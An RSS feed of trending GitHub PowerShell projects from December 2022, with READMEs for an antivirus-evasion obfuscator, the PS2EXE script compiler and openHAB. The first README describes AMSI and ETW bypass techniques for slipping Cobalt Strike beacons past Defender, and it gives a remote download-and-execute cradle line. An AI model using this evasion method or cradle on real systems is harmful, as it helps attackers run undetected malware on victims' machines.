<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-12-25T01:43:22Z</updated>
  <subtitle>Weekly Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>H4de5-7/powershell-obfuscation</title>
    <updated>2022-12-25T01:43:22Z</updated>
    <id>tag:github.com,2022-12-25:/H4de5-7/powershell-obfuscation</id>
    <link href="https://github.com/H4de5-7/powershell-obfuscation" rel="alternate"></link>
    <summary type="html">&lt;p&gt;powershell免杀混淆器，简单有效，VT全过。A simple and effective powershell obfuscaiton tool bypass Anti-Virus&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;powershell-obfuscation&lt;/h1&gt; &#xA;&lt;p&gt;简单有效的powershell免杀混淆的小工具，VT全绿，可过Defender、360等，可执行上线cobaltstrike等操作。&lt;/p&gt; &#xA;&lt;p&gt;AMSI混淆绕过+ETW混淆block+powershell命令混淆绕过。&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;请勿使用于任何非法用途，由此产生的后果自行承担。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;上述测试环境均为实体机。&lt;/p&gt; &#xA;&lt;p&gt;A simple and effective powershell obfuscaiton tool bypass Anti-Virus, VT.&lt;/p&gt; &#xA;&lt;p&gt;AMSI-bypass obfuscation + ETW-block obfuscation + powershell command obfuscation.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Please do not use it for any illegal purpose, and the consequences arising therefrom shall be borne by yourself.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;思路&lt;/h2&gt; &#xA;&lt;p&gt;这段时间看了看powershell反混淆相关的内容与论文，目前反混淆效果最好的应该是2022年qax的《Invoke-Deobfuscation: AST-Based and Semantics-Preserving Deobfuscation for PowerShell Scripts》，该论文延续了19年CCS浙大的思路并进行了改进，使用了变量追踪并在AST层面上进行了invoke解混淆，比defender和VT的效果好不少。&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;不过论文中也提到了当前powershell反混淆研究的难点，一个是自定义function加密解不开，一个是很难去追踪循环中的变量。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;由于部分的反混淆工具会在AST层面上进行反混淆的工作，因此powershell自带的大部分加密解密/编码解码的函数是形同虚设的，如[System.Convert]::FromBase64String等。应该尽可能去使用自定义的加密解密的function。&lt;/p&gt; &#xA;&lt;p&gt;这里针对这两个学术界研究的难点，写了一个简单的powershell混淆器，事实证明效果确实也不错。具体思路如下：&lt;/p&gt; &#xA;&lt;p&gt;1、自定义加密解密function，function中进行字符串的逆序（逆序没有用powershell自带的函数，防止AST层面上解混淆）与字符的+-运算（不使用异或运算的原因是defender对-bxor监控很严格）。&lt;/p&gt; &#xA;&lt;p&gt;2、对上述function进行几次循环的运算。&lt;/p&gt; &#xA;&lt;p&gt;3、为了能让字符有效地输出，最后用base64编码了一下（即便在AST层面上解开也无所谓，因为解开了的内容仍是混淆之后的）。&lt;/p&gt; &#xA;&lt;p&gt;同时对AMSI绕过与ETW block与powershell命令进行了混淆。&lt;/p&gt; &#xA;&lt;p&gt;这里仅仅实现了一个简单的混淆器demo，可以自由发挥，后续要是有时间的话我会继续完善。&lt;/p&gt; &#xA;&lt;p&gt;实验了一下，用qax的反混淆工具与Unit42团队的反混淆工具都是解不开的。&lt;/p&gt; &#xA;&lt;p&gt;The tool with the best anti-obfuscation effect at present should be《Invoke-Deobfuscation: AST-Based and Semantics-Preserving Deobfuscation for PowerShell Scripts》. This paper uses variable tracking and invoke de-obfuscation at the AST level, the effect is much better than that of defender and VT.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;However, this paper also mentioned the difficulties of the current powershell anti-obfuscation research. One is that the custom function encryption cannot be de-obfuscated, and the other is that it is difficult to track the variables in the loop.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Since some de-obfuscation tools de-obfuscates at the AST level, most of the encryption/encoding functions that come with powershell are useless, such as [System.Convert]::FromBase64String and so on. You should use custom encryption and decryption functions as much as possible.&lt;/p&gt; &#xA;&lt;p&gt;Aiming at the difficulties of these the academic research, I wrote a simple powershell obfuscator, and it turns out that the result is really good. The specific ideas are as follows:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Customize the encryption and decryption function. In the function, reverse the string (reversing string does not use the function that comes with powershell to prevent de-confusing at the AST level) and the +- operation of characters (the reason why the XOR operation is not used here is that the defender monitors -bxor strictly).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Perform several loop operations on the encryption and decryption function.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In order to allow the characters to be effectively output, it is finally encoded with base64 (even if it is decoded at the AST level, it does not matter, because the decoded content is still obfuscated).&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;This tool implements AMSI-bypass obfuscation, ETW-block obfuscation and powershell command obfuscation.&lt;/p&gt; &#xA;&lt;h2&gt;使用的方法&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;./powershell-obfuscation.ps1 -c &#34;whoami&#34;&lt;/code&gt; 来混淆命令 obfuscates command&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;./powershell-obfuscation.ps1 -f &#34;filename&#34;&lt;/code&gt; 来混淆指定的文件（绝对路径） obfuscates specific file (absolute path)&lt;/p&gt; &#xA;&lt;p&gt;结果会输出在当前目录下的bypass.ps1中&lt;/p&gt; &#xA;&lt;p&gt;The result can be found in bypass.ps1.&lt;/p&gt; &#xA;&lt;p&gt;以cs的beacon.ps1为例&lt;/p&gt; &#xA;&lt;p&gt;Take beacon.ps1 as an example&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;上线cs可以混淆beacon.ps1然后落地来执行，也可以直接混淆cs的iex下载一句话IEX ((new-object net.webclient).downloadstring(&#39;&lt;a href=&#34;http://ip:port/a&#39;)%E6%9D%A5%E4%B8%8D%E8%90%BD%E5%9C%B0%E6%89%A7%E8%A1%8C%E3%80%82&#34;&gt;http://ip:port/a&#39;)来不落地执行。&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;混淆前VT如下：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/48757788/208227398-4b3abb77-bef6-4891-9798-31255c9557f8.png&#34; alt=&#34;1671255963304&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;混淆后VT如下：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/48757788/208227402-42d2cfce-9b19-4c69-b4b9-da2a4fc609f7.png&#34; alt=&#34;1671255985878&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;上线：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/H4de5-7/powershell-obfuscation/raw/main/CS.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>MScholtes/PS2EXE</title>
    <updated>2022-12-25T01:43:22Z</updated>
    <id>tag:github.com,2022-12-25:/MScholtes/PS2EXE</id>
    <link href="https://github.com/MScholtes/PS2EXE" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Module to compile powershell scripts to executables&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;strong&gt;If your compiled script is mistakenly detected as malware, the best way to prevent this is to certify the executable.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Please do not use PS2EXE to create harmful programs!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h1&gt;PS2EXE&lt;/h1&gt; &#xA;&lt;p&gt;Overworking of the great script of Ingo Karstein with GUI support. The GUI output and input is activated with one switch, real windows executables are generated. With Powershell 5.x support and graphical front end.&lt;/p&gt; &#xA;&lt;p&gt;Module version.&lt;/p&gt; &#xA;&lt;p&gt;You find the script based version here (&lt;a href=&#34;https://github.com/MScholtes/TechNet-Gallery&#34;&gt;https://github.com/MScholtes/TechNet-Gallery&lt;/a&gt;) and here: &lt;a href=&#34;https://gallery.technet.microsoft.com/PS2EXE-GUI-Convert-e7cb69d5&#34;&gt;PS2EXE-GUI: &#34;Convert&#34; PowerShell Scripts to EXE Files with GUI&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Author: Markus Scholtes&lt;/p&gt; &#xA;&lt;p&gt;Version: 1.0.12&lt;/p&gt; &#xA;&lt;p&gt;Date: 2021-12-25&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS C:\&amp;gt; Install-Module ps2exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(on Powershell V4 you may have to install PowershellGet before) or download from here: &lt;a href=&#34;https://www.powershellgallery.com/packages/ps2exe/&#34;&gt;https://www.powershellgallery.com/packages/ps2exe/&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;  Invoke-ps2exe .\source.ps1 .\target.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;  ps2exe .\source.ps1 .\target.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;compiles &#34;source.ps1&#34; into the executable target.exe (if &#34;.\target.exe&#34; is omitted, output is written to &#34;.\source.exe&#34;).&lt;/p&gt; &#xA;&lt;p&gt;or start Win-PS2EXE for a graphical front end with&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;  Win-PS2EXE&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Parameter&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;ps2exe [-inputFile] &#39;&amp;lt;file_name&amp;gt;&#39; [[-outputFile] &#39;&amp;lt;file_name&amp;gt;&#39;]&#xA;       [-prepareDebug] [-x86|-x64] [-lcid &amp;lt;id&amp;gt;] [-STA|-MTA] [-noConsole] [-UNICODEEncoding]&#xA;       [-credentialGUI] [-iconFile &#39;&amp;lt;filename&amp;gt;&#39;] [-title &#39;&amp;lt;title&amp;gt;&#39;] [-description &#39;&amp;lt;description&amp;gt;&#39;]&#xA;       [-company &#39;&amp;lt;company&amp;gt;&#39;] [-product &#39;&amp;lt;product&amp;gt;&#39;] [-copyright &#39;&amp;lt;copyright&amp;gt;&#39;] [-trademark &#39;&amp;lt;trademark&amp;gt;&#39;]&#xA;       [-version &#39;&amp;lt;version&amp;gt;&#39;] [-configFile] [-noOutput] [-noError] [-noVisualStyles] [-exitOnCancel]&#xA;       [-DPIAware] [-winFormsDPIAware] [-requireAdmin] [-supportOS] [-virtualize] [-longPaths]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;       inputFile = Powershell script that you want to convert to executable (file has to be UTF8 or UTF16 encoded)&#xA;      outputFile = destination executable file name or folder, defaults to inputFile with extension &#39;.exe&#39;&#xA;    prepareDebug = create helpful information for debugging    &#xA;      x86 or x64 = compile for 32-bit or 64-bit runtime only&#xA;            lcid = location ID for the compiled executable. Current user culture if not specified&#xA;      STA or MTA = &#39;Single Thread Apartment&#39; or &#39;Multi Thread Apartment&#39; mode&#xA;       noConsole = the resulting executable will be a Windows Forms app without a console window&#xA; UNICODEEncoding = encode output as UNICODE in console mode&#xA;   credentialGUI = use GUI for prompting credentials in console mode&#xA;        iconFile = icon file name for the compiled executable&#xA;           title = title information (displayed in details tab of Windows Explorer&#39;s properties dialog)&#xA;     description = description information (not displayed, but embedded in executable)&#xA;         company = company information (not displayed, but embedded in executable)&#xA;         product = product information (displayed in details tab of Windows Explorer&#39;s properties dialog)&#xA;       copyright = copyright information (displayed in details tab of Windows Explorer&#39;s properties dialog)&#xA;       trademark = trademark information (displayed in details tab of Windows Explorer&#39;s properties dialog)&#xA;         version = version information (displayed in details tab of Windows Explorer&#39;s properties dialog)&#xA;      configFile = write config file (&amp;lt;outputfile&amp;gt;.exe.config)&#xA;        noOutput = the resulting executable will generate no standard output (includes verbose and information channel)&#xA;         noError = the resulting executable will generate no error output (includes warning and debug channel)&#xA;  noVisualStyles = disable visual styles for a generated windows GUI application (only with -noConsole)&#xA;    exitOnCancel = exits program when Cancel or &#34;X&#34; is selected in a Read-Host input box (only with -noConsole)&#xA;        DPIAware = if display scaling is activated, GUI controls will be scaled if possible&#xA;winFormsDPIAware = if display scaling is activated, WinForms use DPI scaling (requires Windows 10 and .Net 4.7 or up)&#xA;    requireAdmin = if UAC is enabled, compiled executable run only in elevated context (UAC dialog appears if required)&#xA;       supportOS = use functions of newest Windows versions (execute [Environment]::OSVersion to see the difference)&#xA;      virtualize = application virtualization is activated (forcing x86 runtime)&#xA;       longPaths = enable long paths ( &amp;gt; 260 characters) if enabled on OS (works only with Windows 10 or up)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A generated executable has the following reserved parameters:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;-debug              Forces the executable to be debugged. It calls &#34;System.Diagnostics.Debugger.Launch()&#34;.&#xA;-extract:&amp;lt;FILENAME&amp;gt; Extracts the powerShell script inside the executable and saves it as FILENAME.&#xA;                    The script will not be executed.&#xA;-wait               At the end of the script execution it writes &#34;Hit any key to exit...&#34; and waits for a key to be pressed.&#xA;-end                All following options will be passed to the script inside the executable.&#xA;                    All preceding options are used by the executable itself and will not be passed to the script.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Remarks&lt;/h2&gt; &#xA;&lt;h3&gt;Use of Powershell Core:&lt;/h3&gt; &#xA;&lt;p&gt;Because &lt;em&gt;Powershell Core&lt;/em&gt; does not have a compiler, &lt;em&gt;PS2EXE&lt;/em&gt; cannot be run natively there. In order to still have &lt;em&gt;PS2EXE&lt;/em&gt; available there, the following procedure must be carried out.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Start &lt;em&gt;Windows Powershell&lt;/em&gt; (for example with &lt;em&gt;Powershell.exe&lt;/em&gt;) and install the module &lt;em&gt;PS2EXE&lt;/em&gt;, for example with&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Install-Module ps2exe -Scope AllUsers&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(this step has to be executed only once)&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Now you can import the module in &lt;em&gt;Powershell Core&lt;/em&gt; with&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Import-Module ps2exe -UseWindowsPowerShell&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;List of cmdlets not implemented:&lt;/h3&gt; &#xA;&lt;p&gt;The basic input/output commands had to be rewritten in C# for PS2EXE. Not implemented are &lt;em&gt;Write-Progress&lt;/em&gt; in console mode (too much work) and &lt;em&gt;Start-Transcript&lt;/em&gt;/&lt;em&gt;Stop-Transcript&lt;/em&gt; (no proper reference implementation by Microsoft).&lt;/p&gt; &#xA;&lt;h3&gt;GUI mode output formatting:&lt;/h3&gt; &#xA;&lt;p&gt;Per default in powershell outputs of commandlets are formatted line per line (as an array of strings). When your command generates 10 lines of output and you use GUI output, 10 message boxes will appear each awaiting for an OK. To prevent this pipe your commandto the comandlet Out-String. This will convert the output to one string array with 10 lines, all output will be shown in one message box (for example: dir C:\ | Out-String).&lt;/p&gt; &#xA;&lt;h3&gt;Parameter processing:&lt;/h3&gt; &#xA;&lt;p&gt;Compiled scripts process parameters like the original script does. One restriction comes from the Windows environment: for all executables all parameters have the type STRING, if there is no implicit conversion for your parameter type you have to convert explicitly in your script. You can even pipe content to the executable with the same restriction (all piped values have the type STRING).&lt;/p&gt; &#xA;&lt;h3&gt;Password security:&lt;/h3&gt; &#xA;&lt;p&gt;Never store passwords in your compiled script! One can simply decompile the script with the parameter -extract. For example&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Output.exe -extract:C:\Output.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;will decompile the script stored in Output.exe.&lt;/p&gt; &#xA;&lt;h3&gt;Script variables:&lt;/h3&gt; &#xA;&lt;p&gt;Since PS2EXE converts a script to an executable, script related variables are not available anymore. Especially the variable $PSScriptRoot is empty.&lt;/p&gt; &#xA;&lt;p&gt;The variable $MyInvocation is set to other values than in a script.&lt;/p&gt; &#xA;&lt;p&gt;You can retrieve the script/executable path independant of compiled/not compiled with the following code (thanks to JacquesFS):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;if ($MyInvocation.MyCommand.CommandType -eq &#34;ExternalScript&#34;)&#xA; { $ScriptPath = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition }&#xA; else&#xA; { $ScriptPath = Split-Path -Parent -Path ([Environment]::GetCommandLineArgs()[0]) &#xA;     if (!$ScriptPath){ $ScriptPath = &#34;.&#34; } }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Window in background in -noConsole mode:&lt;/h3&gt; &#xA;&lt;p&gt;When an external window is opened in a script with -noConsole mode (i.e. for Get-Credential or for a command that needs a cmd.exe shell) the next window is opened in the background.&lt;/p&gt; &#xA;&lt;p&gt;The reason for this is that on closing the external window windows tries to activate the parent window. Since the compiled script has no window, the parent window of the compiled script is activated instead, normally the window of Explorer or Powershell.&lt;/p&gt; &#xA;&lt;p&gt;To work around this, $Host.UI.RawUI.FlushInputBuffer() opens an invisible window that can be activated. The following call of $Host.UI.RawUI.FlushInputBuffer() closes this window (and so on).&lt;/p&gt; &#xA;&lt;p&gt;The following example will not open a window in the background anymore as a single call of &#34;ipconfig | Out-String&#34; will do:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;$Host.UI.RawUI.FlushInputBuffer()&#xA;ipconfig | Out-String&#xA;$Host.UI.RawUI.FlushInputBuffer()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Changes:&lt;/h2&gt; &#xA;&lt;h3&gt;1.0.12 / 2022-11-22&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;new parameter -winFormsDPIAware to support scaling for WinForms in noConsole mode (only Windows 10 or up)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.11 / 2021-11-21&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;fixed password longer than 24 characters error&lt;/li&gt; &#xA; &lt;li&gt;new parameter -DPIAware to support scaling in noConsole mode&lt;/li&gt; &#xA; &lt;li&gt;new parameter -exitOnCancel to stop program execution on cancel in input boxes (only in noConsole mode)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.10 / 2021-04-10&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;parameter outputFile now accepts a target folder (without filename)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.9 / 2021-02-28&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;new parameter UNICODEEncoding to output as UNICODE&lt;/li&gt; &#xA; &lt;li&gt;changed parameter debug to prepareDebug&lt;/li&gt; &#xA; &lt;li&gt;finally dared to use advanced parameters&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.8 / 2020-10-24&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;refactored&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.7 / 2020-08-21&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;bug fix for simultanous progress bars in one pipeline&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.6 / 2020-08-10&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;prompt for choice behaves like Powershell now (console mode only)&lt;/li&gt; &#xA; &lt;li&gt;(limited) support for Powershell Core (starts Windows Powershell in the background)&lt;/li&gt; &#xA; &lt;li&gt;fixed processing of negative parameter values&lt;/li&gt; &#xA; &lt;li&gt;support for animated progress bars (noConsole mode only)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.5 / 2020-07-11&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;support for nested progress bars (noConsole mode only)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.4 / 2020-04-19&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Application.EnableVisualStyles() as default for GUI applications, new parameter -noVisualStyles to prevent this&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.3 / 2020-02-15&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;converted files from UTF-16 to UTF-8 to allow git diff&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;ignore control keys in secure string request in console mode&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.2 / 2020-01-08&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;added examples to github&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.1 / 2019-12-16&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;fixed &#34;unlimited window width for GUI windows&#34; issue in ps2exe.ps1 and Win-PS2EXE&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1.0.0 / 2019-11-08&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;first stable module version&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;0.0.0 / 2019-09-15&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;experimental&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>openhab/openhab-distro</title>
    <updated>2022-12-25T01:43:22Z</updated>
    <id>tag:github.com,2022-12-25:/openhab/openhab-distro</id>
    <link href="https://github.com/openhab/openhab-distro" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The binary distribution of openHAB&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;openHAB Distribution&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/openhab/openhab-distro/actions/workflows/ci-build.yml&#34;&gt;&lt;img src=&#34;https://github.com/openhab/openhab-distro/actions/workflows/ci-build.yml/badge.svg?branch=main&#34; alt=&#34;GitHub Actions Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://ci.openhab.org/job/openHAB-Distribution/&#34;&gt;&lt;img src=&#34;https://ci.openhab.org/job/openHAB-Distribution/badge/icon&#34; alt=&#34;Jenkins Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opensource.org/licenses/EPL-2.0&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-EPL%202-green.svg?sanitize=true&#34; alt=&#34;EPL-2.0&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.bountysource.com/teams/openhab/issues?tracker_ids=28452711&#34;&gt;&lt;img src=&#34;https://www.bountysource.com/badge/tracker?tracker_id=28452711&#34; alt=&#34;Bountysource&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;The open Home Automation Bus (openHAB) project aims at providing a universal integration platform for all things around home automation. It is a pure Java solution, fully based on OSGi.&lt;/p&gt; &#xA;&lt;p&gt;It is designed to be vendor-neutral as well as hardware/protocol-agnostic. openHAB brings together different bus systems, hardware devices, and interface protocols by dedicated bindings. These bindings send and receive commands and status updates on the openHAB event bus. This concept allows designing user interfaces with a unique look&amp;amp;feel, but with the possibility to operate devices based on a big number of different technologies. Besides the user interfaces, it also brings the power of automation logic across different system boundaries.&lt;/p&gt; &#xA;&lt;p&gt;For further information please refer to our homepage &lt;a href=&#34;https://www.openhab.org&#34;&gt;www.openhab.org&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For the latest snapshot builds, please see our &lt;a href=&#34;https://ci.openhab.org/job/openHAB-Distribution/&#34;&gt;Jenkins job&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;Please refer to &lt;a href=&#34;https://www.openhab.org/docs/tutorial/&#34;&gt;our tutorials&lt;/a&gt; on how to get started with openHAB.&lt;/p&gt; &#xA;&lt;h2&gt;Community: How to Get Involved&lt;/h2&gt; &#xA;&lt;p&gt;As any good open source project, openHAB welcomes community participation in the project. Read more in the &lt;a href=&#34;https://raw.githubusercontent.com/openhab/openhab-distro/main/CONTRIBUTING.md&#34;&gt;how to contribute&lt;/a&gt; guide.&lt;/p&gt; &#xA;&lt;p&gt;If you are a developer and want to jump right into the sources and execute openHAB from within an IDE, please have a look at the &lt;a href=&#34;https://www.openhab.org/docs/developer/#setup-the-development-environment&#34;&gt;IDE setup&lt;/a&gt; procedures.&lt;/p&gt; &#xA;&lt;p&gt;You can also learn &lt;a href=&#34;https://www.openhab.org/docs/developer/bindings/&#34;&gt;how openHAB bindings are developed&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;In case of problems or questions, please join our vibrant &lt;a href=&#34;https://community.openhab.org/&#34;&gt;openHAB community&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
</feed>